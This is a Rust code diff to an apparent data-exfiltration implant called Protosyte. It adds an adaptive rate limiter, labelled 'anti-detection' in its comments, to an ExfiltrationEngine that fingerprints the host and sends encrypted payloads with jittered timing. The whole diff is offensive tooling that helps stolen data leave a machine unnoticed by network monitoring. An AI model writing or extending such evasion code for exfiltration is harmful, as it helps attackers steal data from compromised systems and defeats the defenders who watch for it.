@@ -43,6 +43,7 @@ pub struct ExfiltrationEngine {
     mission_id: u64,
     sequence: std::sync::atomic::AtomicU32,
     host_fingerprint: Vec<u8>,
+    rate_limiter: Arc<crate::rate_limiter::RateLimiter>,
 }
 
 impl ExfiltrationEngine {
@@ -63,6 +64,27 @@ impl ExfiltrationEngine {
         // Generate host fingerprint (SHA256 of hostname + MAC address)
         let host_fingerprint = Self::generate_host_fingerprint();
         
+        // Initialize rate limiter (anti-detection)
+        // Default: 64KB/sec, 10 messages/min, adaptive enabled
+        let rate_limit_kbps = env::var("PROTOSYTE_RATE_LIMIT_KBPS")
+            .unwrap_or_else(|_| "64".to_string())
+            .parse()
+            .unwrap_or(64);
+        let msg_per_min = env::var("PROTOSYTE_MSG_PER_MIN")
+            .unwrap_or_else(|_| "10".to_string())
+            .parse()
+            .unwrap_or(10);
+        let adaptive_rate = env::var("PROTOSYTE_ADAPTIVE_RATE")
+            .unwrap_or_else(|_| "true".to_string())
+            .parse()
+            .unwrap_or(true);
+        
+        let rate_limiter = Arc::new(crate::rate_limiter::RateLimiter::new(
+            rate_limit_kbps * 1024, // Convert KB to bytes
+            msg_per_min,
+            adaptive_rate,
+        ));
+        
         Self {
             crypto,
             data_rx,
@@ -71,6 +93,7 @@ impl ExfiltrationEngine {
             mission_id: config.mission_id,
             sequence: std::sync::atomic::AtomicU32::new(0),
             host_fingerprint,
+            rate_limiter,
         }
     }
     
@@ -144,7 +167,13 @@ impl ExfiltrationEngine {
                                 }
                             };
                             
-                            // Apply jitter to timing
+                            // Rate limiting (anti-detection) - check before sending
+                            if let Some(wait_time) = self.rate_limiter.acquire(envelope_bytes.len()).await {
+                                Logger::info("EXFIL", &format!("Rate limited: waiting {}ms", wait_time.as_millis()));
+                                sleep(wait_time).await;
+                            }
+                            
+                            // Apply jitter to timing (in addition to rate limiting)
                             let jitter_duration = self.calculate_jitter();
                             if last_send.elapsed() < self.interval + jitter_duration {
                                 sleep(self.interval + jitter_duration - last_send.elapsed()).await;
@@ -156,10 +185,12 @@ impl ExfiltrationEngine {
                             match send_result {
                                 Ok(_) => {
                                     Logger::info("EXFIL", "Payload sent successfully");
+                                    self.rate_limiter.record_success(); // Update adaptive rate limiter
                                     last_send = Instant::now();
                                 }
                                 Err(e) => {
                                     Logger::warn("EXFIL", &format!("Failed to send payload: {}. Will retry on next interval.", e));
+                                    self.rate_limiter.record_error(); // Back off on errors (adaptive)
                                     // Note: Retry logic can be added here or in send_payload itself
                                 }
                             }
